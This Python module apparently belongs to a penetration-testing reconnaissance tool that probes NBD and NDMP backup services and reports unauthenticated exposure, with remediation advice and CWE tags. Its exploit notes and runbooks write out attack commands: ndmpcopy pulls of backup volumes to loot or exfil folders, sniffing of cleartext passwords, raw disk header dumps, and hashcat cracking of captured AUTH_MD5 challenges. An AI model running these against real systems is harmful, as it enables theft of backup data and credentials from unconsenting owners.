    "ndmp_legacy_version": (
        "The NDMP server chose an end-of-life protocol version (v2 or v3). "
        "Pre-v4 servers historically failed to gate CONFIG_GET_* on auth "
        "at all; even when they do, the version alone is a posture signal."),
    "ndmp_session_hijack_surface": (
        "NDMP DATA / MOVER sessions negotiated via NDMP_MOVER_LISTEN / "
        "NDMP_DATA_LISTEN are unauthenticated TCP flows between the tape "
        "server and data server. An attacker on the same segment can hijack "
        "the data channel and inject or exfiltrate the backup stream."),
}


TESTING_NARRATIVE = [
    ("1. NBD fixed-newstyle handshake",
     "recce speaks the NBD protocol directly (stdlib socket). Reads the "
     "NBDMAGIC greeting, echoes client flags, and enters the options phase."),
    ("2. NBD export inventory",
     "It sends NBD_OPT_LIST and records every export name + description "
     "with no credential."),
    ("3. NBD per-export info + block-0 fingerprint",
     "For each export it sends NBD_OPT_INFO (size + transmission flags "
     "including READ_ONLY) and, when --active-deep is on, a single "
     "NBD_OPT_GO + NBD_CMD_READ at offset 0 to identify the on-disk "
     "format (LUKS / VMDK / QCOW / MBR / GPT / ext / NTFS). It never "
     "writes and never reads a second block."),
    ("4. NBD TLS posture",
     "It sends NBD_OPT_STARTTLS on a fresh socket to determine whether "
     "the transport is cleartext-only, optional, or required."),
    ("5. NDMP XDR handshake",
     "recce speaks NDMP over TCP (SNIA v4, with v3/v2 fallback). Sends "
     "NDMP_CONNECT_OPEN, then CONFIG_GET_SERVER_INFO / HOST_INFO / "
     "FS_INFO / TAPE_INFO / SCSI_INFO - all pre-auth on stock configs."),
    ("6. NDMP AUTH_MD5 challenge capture",
     "It solicits a fresh AUTH_MD5 challenge and posts a dummy response. "
     "The (challenge, response, username) tuple is written for hashcat "
     "-m 50 offline cracking. recce never online-bruteforces."),
    ("7. Runbook",
     "Follow-on commands are staged per finding (nbd-client --list, ndmp "
     "diagnostic tools, hashcat)."),
]


_finding = finding_builder("nbd_ndmp", _NARRATIVE)


def _fmt_size(n: int) -> str:
    for unit in ("B", "KiB", "MiB", "GiB", "TiB", "PiB"):
        if n < 1024:
            return f"{n:.1f} {unit}"
        n /= 1024.0
    return f"{n:.1f} EiB"


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not (is_nbd(p) or is_ndmp(p)):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            if is_nbd(p):
                out.extend(_nbd_findings(tgt, pr, h.ip, p.portid))
            else:
                out.extend(_ndmp_findings(tgt, pr, h.ip, p.portid))
    return out


def _nbd_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
    out: list[dict] = []
    exports = pr.get("exports") or []
    if exports:
        names = ", ".join(e.get("name", "") for e in exports[:8])
        # T2 proof-of-exploit: NBD_OPT_INFO on a listed export already ran
        # (single option round-trip per _probe_nbd) — when the server
        # returned a real NBD_INFO_EXPORT block (size + transmission-flag
        # bits), that is a controlled read past the T1 name enumeration.
        # Non-destructive: no writes, no transmission-phase reads. Additions
        # only — falls back to T1 when no INFO evidence is present.
        info_proof = next(
            (e for e in exports
             if (e.get("flags") or e.get("size", 0) > 0)),
            None)
        proof_tier = "t2" if info_proof else "t1"
        proof_line = ""
        if info_proof:
            flag_bits = ", ".join(info_proof.get("flags") or []) or "(none)"
            proof_line = (
                f"  T2 proof - NBD_OPT_INFO({info_proof.get('name','?')!r}) "
                f"returned size={_fmt_size(info_proof.get('size', 0))}, "
                f"flags=[{flag_bits}] (flags_raw=0x"
                f"{info_proof.get('flags_raw', 0):04x}) - real server-side "
                "export metadata read succeeded without a credential.")
        out.append(_finding(
            "high", "NBD exports enumerable without authentication", tgt,
            f"NBD_OPT_LIST returned {len(exports)} export(s) with no "
            f"credential: {names}. Storage-layout / block-device inventory "
            "leaks unauth over the socket." + proof_line,
            "nbd-client",
            f"nbd-client -l {ip} {port}   "
            f"# then: qemu-nbd --list --tls-creds= tcp://{ip}:{port}",
            "Restrict the NBD socket to a management VLAN, require TLS "
            "with a peer certificate, and prefer nbdkit + Unix-socket "
            "hand-off over network exposure.",
            ["CWE-306", "CWE-200"], kind="nbd_export_list",
            exploit_note=(
                f"nbd-client -l {ip} {port}  "
                "# list every export by name and description"),
            depth_tier=proof_tier))
    # Per-export write / fingerprint findings.
    writable = []
    fps = []
    for e in exports:
        flags = e.get("flags") or []
        if e.get("flags_raw") is not None and "READ_ONLY" not in flags and flags:
            writable.append(e)
        if e.get("block0_label"):
            fps.append(e)
    if writable:
        names = ", ".join(w.get("name", "") for w in writable[:8])
        sizes = ", ".join(_fmt_size(w.get("size", 0)) for w in writable[:8])
        out.append(_finding(
            "high",
            "NBD export writable without authentication (block-level ransomware)",
            tgt,
            f"{len(writable)} export(s) lack the READ_ONLY transmission "
            f"flag AND require no credential: {names} (sizes: {sizes}). "
            "Anyone reachable on the network can write raw blocks and "
            "destroy the volume.",
            "nbd-client",
            f"nbd-client -l {ip} {port}   "
            "# confirm READ_ONLY is missing from -o flags",
            "Serve the export read-only at the server (nbd-server: "
            "read only = true; qemu-nbd -r; nbdkit --readonly), and "
            "restrict the socket to a management VLAN.",
            ["CWE-306", "CWE-732"], kind="nbd_export_writable",
            exploit_note=(
                f"modprobe nbd; nbd-client {ip} {port} -N <export> "
                "/dev/nbd0; blockdev --getro /dev/nbd0  # 0 = writable"),
            depth_tier="t1"))
    for fp in fps:
        out.append(_finding(
            "high", f"NBD export fingerprint reveals {fp['block0_label']}", tgt,
            f"NBD_CMD_READ of block 0 on export {fp.get('name','')!r} "
            f"matched: {fp['block0_label']}. Combined with the unauthenticated "
            "READ this exposes the volume for offline mount / decryption.",
            "nbd-client",
            f"nbd-client {ip} {port} -N {fp.get('name','')} /dev/nbd0 && "
            f"file -s /dev/nbd0",
            "Restrict the NBD socket to a management VLAN and require "
            "TLS + peer certificate.",
            ["CWE-200"], kind="nbd_export_fingerprint",
            exploit_note=(
                f"nbd-client {ip} {port} -N <export> /dev/nbd0; "
                "dd if=/dev/nbd0 bs=1M count=2 of=header.bin; "
                "cryptsetup luksDump header.bin ; # or fsck -N /dev/nbd0"),
            depth_tier="t2"))
    # TLS posture
    tls = pr.get("tls") or {}
    if tls and (not tls.get("tls_supported") or tls.get("list_before_tls")):
        detail_parts = []
        if not tls.get("tls_supported"):
            detail_parts.append("NBD_OPT_STARTTLS refused by the server")
        if tls.get("list_before_tls"):
            detail_parts.append("NBD_OPT_LIST succeeded BEFORE TLS "
                                "(export names cross the network cleartext)")
        out.append(_finding(
            "medium", "NBD transport is cleartext (NBD_OPT_STARTTLS not enforced)",
            tgt,
            ". ".join(detail_parts) + ".",
            "openssl", f"openssl s_client -connect {ip}:{port}   "
            "# a plain TCP banner (NBDMAGIC) instead of a TLS ServerHello "
            "confirms cleartext",
            "Enable NBD over TLS (NBD_OPT_STARTTLS) with a peer certificate; "
            "reject NBD_OPT_LIST until TLS is up.",
            ["CWE-319"], kind="nbd_cleartext",
            exploit_note=(
                f"openssl s_client -connect {ip}:{port}  # if NBDMAGIC banner "
                "instead of TLS ServerHello, plaintext confirmed"),
            depth_tier="t0"))
    return out


def _ndmp_findings(tgt: str, pr: dict, ip: str, port: int) -> list[dict]:
    out: list[dict] = []
    si = pr.get("server_info") or {}
    if si:
        vp = f"{si.get('vendor','')} {si.get('product','')} {si.get('revision','')}".strip()
        out.append(_finding(
            "high", "NDMP server info leaked pre-auth (CONFIG_GET_SERVER_INFO)", tgt,
            f"NDMP_CONFIG_GET_SERVER_INFO returned vendor / product / revision "
            f"with no credential: {vp!r}. Auth types advertised: "
            f"{', '.join(si.get('auth_type_names') or []) or '(none)'}.",
            "ndmpcopy",
            f"ndmpcopy -sa root:'' {ip}:/vol/foo -da root:'' /dev/null   "
            "# confirm CONFIG_GET_SERVER_INFO leaks without a valid auth",
            "Require AUTH_MD5 on every NDMP endpoint, disable AUTH_NONE and "
            "AUTH_TEXT, restrict to a dedicated backup VLAN.",
            ["CWE-200", "CWE-306"], kind="ndmp_info_unauth",
            exploit_note=(
                f"ndmpcopy -sa root:'' {ip}:/ /tmp/dev-null-mock  "
                "# if CONFIG_GET_SERVER_INFO returns pre-auth"),
            depth_tier="t1"))
        if NDMP_AUTH_NONE in (si.get("auth_types") or []):
            out.append(_finding(
                "critical",
                "NDMP server accepts unauthenticated backup control "
                "(AUTH_NONE advertised)",
                tgt,
                "CONFIG_GET_SERVER_INFO advertised AUTH_NONE in its "
                "supported auth_types list. On stock configs this means "
                "CONFIG_* / DATA / MOVER operations proceed with NO "
                "credential - direct control of the filer's backup plane.",
                "ndmpcopy",
                f"ndmpcopy -sa '' -da '' {ip}:/ /tmp/loot",
                "Disable AUTH_NONE on every NDMP endpoint; require AUTH_MD5.",
                ["CWE-306", "CWE-284"], kind="ndmp_unauth",
                exploit_note=(
                    f"ndmpcopy -sa '' -da '' {ip}:/vol/foo /tmp/loot ; "
                    "# if it copies, backup control is unauth"),
                depth_tier="t1"))
        if NDMP_AUTH_TEXT in (si.get("auth_types") or []):
            out.append(_finding(
                "high", "NDMP AUTH_TEXT enabled (backup admin password cleartext)",
                tgt,
                "The NDMP server advertises AUTH_TEXT: any authenticated "
                "backup admin sends the password in the clear on the "
                "control channel. Anyone MITM-positioned on the backup "
                "VLAN reads it directly.",
                "tcpdump",
                f"tcpdump -i any -A 'host {ip} and port {port}'",
                "Disable AUTH_TEXT on every NDMP endpoint; use AUTH_MD5.",
                ["CWE-319", "CWE-522"], kind="ndmp_cleartext_auth",
                exploit_note=(
                    f"tcpdump -i any -A 'host {ip} and port 10000'  "
                    "# capture the AUTH_TEXT cleartext credential when an "
                    "admin logs in"),
                depth_tier="t0"))
    hi = pr.get("host_info") or {}
    if hi.get("hostname"):
        detail = (f"hostname={hi.get('hostname','')} "
                  f"os={hi.get('os_type','')} {hi.get('os_vers','')} "
                  f"hostid={hi.get('hostid','')}")
        out.append(_finding(
            "high", "NDMP host info leaked pre-auth (CONFIG_GET_HOST_INFO)", tgt,
            f"NDMP_CONFIG_GET_HOST_INFO returned: {detail}. Feeds "
            "known_hostnames / known_domains for cross-service scoring.",
            "ndmp", f"# recce parses HOST_INFO from CONNECT_OPEN + "
            f"CONFIG_GET_HOST_INFO on {ip}:{port}",
            "Restrict NDMP to a dedicated backup VLAN; require AUTH_MD5.",
            ["CWE-200"], kind="ndmp_host_info",
            exploit_note=(
                "review NDMP hostname/os/version fields; cross-check with "
                "SMB/AD enum"),
            depth_tier="t0"))
    fs = (pr.get("fs_info") or {}).get("filesystems") or []
    tapes = (pr.get("tape_info") or {}).get("tapes") or []
    scsi = (pr.get("scsi_info") or {}).get("scsi") or []
    if fs or tapes or scsi:
        parts = []
        if fs: parts.append(f"{len(fs)} filesystem(s)")
        if tapes: parts.append(f"{len(tapes)} tape drive(s)")
        if scsi: parts.append(f"{len(scsi)} SCSI backend(s)")
        fs_names = ", ".join(f.get("logical_device", "") for f in fs[:6])
        out.append(_finding(
            "high", "NDMP filesystem / tape / SCSI inventory leaked pre-auth", tgt,
            f"CONFIG_GET_FS_INFO / TAPE_INFO / SCSI_INFO returned "
            f"{'; '.join(parts)} with no credential. Filesystem paths: "
            f"{fs_names or '(none)'}.",
            "ndmp", f"# recce enumerated {ip}:{port} pre-auth",
            "Require AUTH_MD5, disable AUTH_NONE + AUTH_TEXT, and restrict "
            "NDMP to a dedicated backup VLAN.",
            ["CWE-200", "CWE-306"], kind="ndmp_inventory_leak",
            exploit_note=(
                "review recce probe output for filesystem paths; then: "
                f"ndmpcopy -sa <user>:<pass> {ip}:/<vol> -da root:'' /tmp/exfil"),
            depth_tier="t1"))
    cap = pr.get("md5_capture") or {}
    if cap.get("captured"):
        line = hashcat_ndmp_md5_line(cap.get("username", ""),
                                     cap.get("challenge_hex", ""),
                                     cap.get("response_hex", ""))
        out.append(_finding(
            "high", "NDMP AUTH_MD5 challenge captured (offline-crackable)", tgt,
            f"CONFIG_GET_AUTH_ATTR(AUTH_MD5) returned a fresh 64-byte "
            f"challenge to an unauthenticated client; NDMP_CONNECT_CLIENT_AUTH "
            f"with a bogus response was posted (server error_code="
            f"{cap.get('error_code',0)}). The captured challenge is HMAC-MD5 "
            f"crackable offline. Hashcat line (mode 50):\n\n    {line}",
            "hashcat",
            f"printf '%s\\n' '{line}' > loot/ndmp.hash && "
            "hashcat -m 50 loot/ndmp.hash wordlist.txt",
            "Rotate the backup admin password to a high-entropy value; "
            "restrict NDMP to a dedicated backup VLAN. There is no "
            "protocol-level fix - offline crackability is inherent.",
            ["CWE-326", "CWE-916"], kind="ndmp_md5_challenge_capture",
            exploit_note=(
                "printf '%s\\n' \"<response>:<challenge>:<user>\" > "
                "loot/ndmp.hash ; hashcat -m 50 loot/ndmp.hash "
                "/usr/share/wordlists/rockyou.txt ; then ndmpcopy -sa "
                f"<user>:<cracked> {ip}:/vol/... -da root:'' /tmp/loot"),
            depth_tier="t2"))
    if pr.get("downgraded") and pr.get("version"):
        out.append(_finding(
            "medium", f"NDMP legacy protocol version negotiated (v{pr['version']})",
            tgt,
            f"CONNECT_OPEN was declined at v4 and accepted at "
            f"v{pr['version']}. Pre-v4 NDMP historically did not gate "
            "CONFIG_GET_* on authentication at all.",
            "ndmp", f"# recce negotiated v{pr['version']} on {ip}:{port}",
            "Upgrade the NDMP server to a v4-capable implementation and "
            "reject legacy versions.",
            ["CWE-1104", "CWE-1188"], kind="ndmp_legacy_version",
            exploit_note=(
                "note version in report; pair with vendor advisory review"),
            depth_tier="t0"))
    # Session-hijack surface: we always report this once for any live NDMP
    # endpoint, since MOVER/DATA channels are unauth by design in the spec.
    if pr.get("reachable"):
        out.append(_finding(
            "critical", "NDMP DATA / MOVER session hijack surface exposed", tgt,
            "NDMP DATA and MOVER connections negotiated via "
            "NDMP_MOVER_LISTEN / NDMP_DATA_LISTEN are unauthenticated TCP "
            "sessions between the tape server and data server. An attacker "
            "on the same network segment can hijack the data channel to "
            "inject or exfiltrate backup streams. Non-destructive detection: "
            "recce reports the surface; it never hijacks.",
            "wireshark",
            f"# recce reports; watch: tcp.port==10000 and ip.addr=={ip}",
            "Restrict NDMP + associated MOVER ports to a dedicated backup "
            "VLAN; enable AUTH_MD5 on the control channel; segment tape "
            "servers from user networks.",
            ["CWE-306", "CWE-300"], kind="ndmp_session_hijack_surface",
            exploit_note=(
                f"wireshark: tcp.port==10000 and ip.addr=={ip}  "
                "# observe MOVER_LISTEN + connect to the returned data port"),
            depth_tier="t0"))
    return out


# --- runbook + integrations -------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    if port == _NBD_PORT:
        steps = [
            ("recon", "nbd-client", f"nbd-client -l {ip} {port}",
             "List exports (unauth NBD_OPT_LIST)."),
            ("recon", "qemu-nbd", f"qemu-nbd --list tcp://{ip}:{port}",
             "Show export size + transmission flags."),
            ("loot", "nbd-client",
             f"modprobe nbd && nbd-client {ip} {port} -N <export> /dev/nbd0 "
             "&& file -s /dev/nbd0",
             "Mount the export read-only and identify its on-disk format."),
        ]
    else:
        steps = [
            ("recon", "ndmp",
             f"ndmpcopy -sa root:'' {ip}:/ /dev/null   "
             "# confirm CONFIG_GET_SERVER_INFO returns pre-auth",
             "Confirm NDMP CONFIG_GET_* leaks."),
            ("crack", "hashcat", "hashcat -m 50 loot/ndmp.hash wordlist.txt",
             "Crack the captured AUTH_MD5 challenge/response (HMAC-MD5)."),
            ("post-auth", "ndmp",
             f"ndmpcopy -sa <user>:<pass> {ip}:/vol/foo -da root:'' /tmp/",
             "Pull a backup stream once cracked."),
        ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "nbd_ndmp", _NDMP_PORT)


# --- cross-service wiring ---------------------------------------------------

def wire_cross_service(hosts: list[Host], probes: dict) -> dict:
    """Fold NDMP-derived hostnames into Host.hostnames and stash MD5 tuples
    for the cred store. Returns {hostnames_added, hashes, usernames}."""
    added_names: list[tuple[str, str]] = []
    hashes: list[dict] = []
    users: list[str] = []
    for h in hosts:
        for p in h.open_ports:
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            hi = pr.get("host_info") or {}
            hostname = hi.get("hostname") or ""
            if hostname:
                if hostname not in h.hostnames:
                    h.hostnames.append(hostname)
                    added_names.append((h.ip, hostname))
            cap = pr.get("md5_capture") or {}
            if cap.get("captured"):
                hashes.append({
                    "ip": h.ip, "port": p.portid,
                    "username": cap.get("username", ""),
                    "challenge_hex": cap.get("challenge_hex", ""),
                    "response_hex": cap.get("response_hex", ""),
                    "hashcat_mode": 50,
                    "hashcat_line": hashcat_ndmp_md5_line(
                        cap.get("username", ""),
                        cap.get("challenge_hex", ""),
                        cap.get("response_hex", "")),
                })
                if cap.get("username"):
                    users.append(cap["username"])
    return {"hostnames_added": added_names, "hashes": hashes,
            "usernames": users}


# --- analyze ---------------------------------------------------------------

def _probe_nbd(t: dict) -> dict:
    ip, port = t["ip"], t["port"]
    pr = nbd_list_exports(ip, port)
    if not pr.get("reachable"):
        return pr
    tls = nbd_tls_posture(ip, port)
    pr["tls"] = tls
    # Cap per-host exports probed to keep the sweep bounded.
    for exp in (pr.get("exports") or [])[:16]:
        info = nbd_export_info(ip, port, exp["name"])
        exp["size"] = info.get("size", 0)
        exp["flags"] = info.get("flags", [])
        exp["flags_raw"] = info.get("flags_raw", 0)
        if "block_min" in info:
            exp["block_min"] = info["block_min"]
            exp["block_preferred"] = info["block_preferred"]
            exp["block_max"] = info["block_max"]
    return pr


def _probe_nbd_deep(t: dict) -> dict:
    pr = _probe_nbd(t)
    if not pr.get("reachable"):
        return pr
    for exp in (pr.get("exports") or [])[:8]:
        fp = nbd_block0_fingerprint(t["ip"], t["port"], exp["name"])
        if fp.get("label"):
            exp["block0_label"] = fp["label"]
        if fp.get("hex_head"):
            exp["block0_hex"] = fp["hex_head"]
    return pr


def _probe_ndmp(t: dict) -> dict:
    ip, port = t["ip"], t["port"]
    pr = ndmp_probe(ip, port)
    if pr.get("reachable"):
        cap = ndmp_capture_md5(ip, port)
        pr["md5_capture"] = cap
    return pr


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            active_deep: bool = False) -> dict:
    """Full NBD + NDMP analysis. `active_deep` enables the one-block
    NBD_CMD_READ fingerprint (still read-only, one 512-byte block per export)."""
    from . import svcprobe
    nbd_ts = nbd_targets(hosts)
    ndmp_ts = ndmp_targets(hosts)
    probes: dict = {}
    state: dict = {}
    nbd_probe = _probe_nbd_deep if active_deep else _probe_nbd
    if active:
        for t, pr in svcprobe.iter_probe(nbd_ts, nbd_probe, budget=budget,
                                         progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["exports"] = len(pr.get("exports") or [])
        for t, pr in svcprobe.iter_probe(ndmp_ts, _probe_ndmp, budget=budget,
                                         progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = pr.get("reachable", False)
                t["version"] = pr.get("version", 0)
    fs = findings(hosts, probes)
    wire = wire_cross_service(hosts, probes) if probes else {
        "hostnames_added": [], "hashes": [], "usernames": []}
    targets = nbd_ts + ndmp_ts
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "wire": wire,
            "stats": {"targets": len(targets), "findings": len(fs),
                      "nbd_targets": len(nbd_ts),
                      "ndmp_targets": len(ndmp_ts),
                      "stopped": state.get("stopped")}}
